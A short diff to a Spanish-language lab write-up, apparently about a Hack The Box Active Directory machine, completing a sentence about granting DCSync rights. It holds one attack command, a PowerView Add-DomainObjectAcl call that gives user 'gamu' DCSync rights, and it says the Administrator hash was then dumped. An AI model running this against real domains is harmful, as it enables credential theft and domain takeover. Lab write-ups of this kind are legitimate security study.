@@ -160,5 +160,6 @@ con la primera linea seteamos los privilegios de DCSync al usuario que hemos cre
 ![[Pasted image 20240319002640.png]]
 
 ### impacket-secretdump
-`Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity gamu -Rights DCSync` agregamos el usuario al dominio y le damos permisos de DCSync luego ejecutamos un ataque DCSyn
+`Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity gamu -Rights DCSync` agregamos el usuario al dominio y le damos permisos de DCSync luego ejecutamos un ataque DCSync y podemos ver el hash del usuario Administrator
 ![[Pasted image 20240319005053.png]]
+
